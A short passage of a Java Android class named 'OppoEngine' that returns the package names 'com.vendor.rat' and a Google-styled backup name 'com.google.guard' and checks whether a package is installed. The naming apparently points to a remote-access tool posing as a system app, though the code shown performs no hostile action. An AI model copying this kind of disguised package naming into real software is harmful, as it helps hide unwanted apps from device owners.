        return "com.vendor.rat";
    }

    private String getBackupAppName() {
        return "com.google.guard";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    private boolean isBackupAppInstalled(String packageName) {
        try {
            android.content.Context ctx = getContext();
            if (ctx == null) return false;
            ctx.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // ====== equals/hashCode — 对齐 vendor 模式 ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof OppoEngine;
    }

    @Override
    public int hashCode() {
        return Objects.hash(OppoEngine.class.getName());
    }
}
